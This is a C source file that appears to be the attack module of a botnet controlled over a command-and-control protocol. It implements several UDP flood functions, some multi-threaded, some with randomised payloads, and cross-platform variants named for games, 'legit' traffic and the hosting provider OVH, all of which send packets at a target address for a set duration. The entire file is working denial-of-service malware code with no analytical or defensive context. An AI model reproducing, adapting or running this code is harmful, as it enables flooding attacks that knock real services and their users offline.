#include "headers/includes.h"

#include "headers/attacks.h"
#include "headers/cnc_protocol.h"
#include "headers/rand.h"

#define SIZE_UDP 1400

void attack_udp_generic(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, SIZE_UDP);
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);

    int sock = (int)socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0) return;

    if (sport != 0xffff) {
        struct sockaddr_in bind_addr;
        util_zero(&bind_addr, sizeof(bind_addr));
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    }

    struct sockaddr_in dst;
    util_zero(&dst, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    dst.sin_addr.s_addr = inet_addr(ip);

    connect(sock, (struct sockaddr*)&dst, sizeof(dst));

    unsigned char *payload = calloc(1, payload_size);
    if (!payload) {
        close(sock);
        return;
    }
    util_zero(payload, payload_size);

    time_t end = time(NULL) + duration;
    while(time(NULL) < end){
        send(sock, (char *)payload, payload_size, 0);
    }

    free(payload);
    close(sock);
}


void attack_udp_hex(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len){
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, SIZE_UDP);
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);

    int sock = (int)socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0) return;

    if (sport != 0xffff) {
        struct sockaddr_in bind_addr;
        util_zero(&bind_addr, sizeof(bind_addr));
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    }

    struct sockaddr_in dst;
    util_zero(&dst, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    dst.sin_addr.s_addr = inet_addr(ip);

    connect(sock, (struct sockaddr*)&dst, sizeof(dst));

    unsigned char *payload = calloc(1, payload_size);
    if (!payload) {
        close(sock);
        return;
    }

    time_t end = time(NULL) + duration;
    while(time(NULL) < end){
        if (payload_size > 0)
            rand_str((char *)payload, payload_size);
        send(sock, (char *)payload, payload_size, 0);
    }

    free(payload);
    close(sock);
}


struct udp_thread_data {
    char ip[16];
    int port;
    int payload_size;
    int duration;
};

#ifdef _WIN32
DWORD WINAPI udp_threads_flood(LPVOID arg) {
#else
void *udp_threads_flood(void *arg) {
#endif
    struct udp_thread_data *data = (struct udp_thread_data *)arg;
    int sock = (int)socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return 0;

    struct sockaddr_in dst;
    util_zero(&dst, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(data->port);
    dst.sin_addr.s_addr = inet_addr(data->ip);

    connect(sock, (struct sockaddr *)&dst, sizeof(dst));

    unsigned char *payload = malloc(data->payload_size);
    if (!payload) {
        close(sock);
        return 0;
    }

    time_t end = time(NULL) + data->duration;
    while (time(NULL) < end) {
        if (data->payload_size > 0) {
            rand_str((char *)payload, data->payload_size);
        }
        send(sock, (char *)payload, data->payload_size, 0);
    }

    free(payload);
    close(sock);
    return 0;
}


void attack_udp_threads(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, SIZE_UDP);
    int num_threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 4);

    if (num_threads > 128) num_threads = 128;

    struct udp_thread_data data;
    util_strncpy(data.ip, ip, 15);
    data.port = port;
    data.payload_size = payload_size;
    data.duration = duration;

#ifdef _WIN32
    HANDLE threads[128];
    for (int i = 0; i < num_threads; i++) {
        threads[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)udp_threads_flood, (void *)&data, 0, NULL);
    }
    WaitForMultipleObjects(num_threads, threads, TRUE, duration * 1000);
    for (int i = 0; i < num_threads; i++) {
        TerminateThread(threads[i], 0);
        CloseHandle(threads[i]);
    }
#else
    pthread_t threads[num_threads];
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, udp_threads_flood, (void *)&data);
    }
    sleep(duration);
    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
    }
#endif
}

void attack_udp_game(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len)
{
    int sock;
    struct sockaddr_in addr;
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = (uint16_t)attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    int data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);

    if ((sock = (int)socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        return;

    if (sport != 0xffff)
    {
        struct sockaddr_in bind_addr;
        util_zero(&bind_addr, sizeof (struct sockaddr_in));
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = 0;
        bind(sock, (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    connect(sock, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    char *data = calloc(1, data_len);
    if (!data) {
        close(sock);
        return;
    }

    time_t end = time(NULL) + duration;
    while (time(NULL) < end)
    {
        if (data_rand)
            rand_str(data, data_len);

        send(sock, data, data_len, 0);
    }

    free(data);
    close(sock);
}

void attack_udp_legit(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len)
{
    int fd;
    struct sockaddr_in target_addr;
    struct sockaddr_in bind_addr;
    char *pkt;

    util_zero(&target_addr, sizeof(target_addr));
    util_zero(&bind_addr, sizeof(bind_addr));

    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);

    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(ip);
    target_addr.sin_port = (port == 0) ? htons(rand_next() % 65535 + 1) : htons(port);

    if ((fd = (int)socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        return;

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = (sport == 0xffff) ? htons(rand_next() % 65535 + 1) : htons(sport);
    bind_addr.sin_addr.s_addr = 0;

    bind(fd, (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
    connect(fd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr_in));

    pkt = calloc(1400, sizeof(char));

    time_t end = time(NULL) + duration;
    while (time(NULL) < end)
    {
        uint16_t data_len = 700 + (rand_next() % 301);
        rand_str(pkt, data_len);

        send(fd, pkt, data_len, 0);
    }
    free(pkt);
    close(fd);
}

void attack_udp_ovh(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    attack_udp_threads(ip, port, duration, opts, opts_len);
}
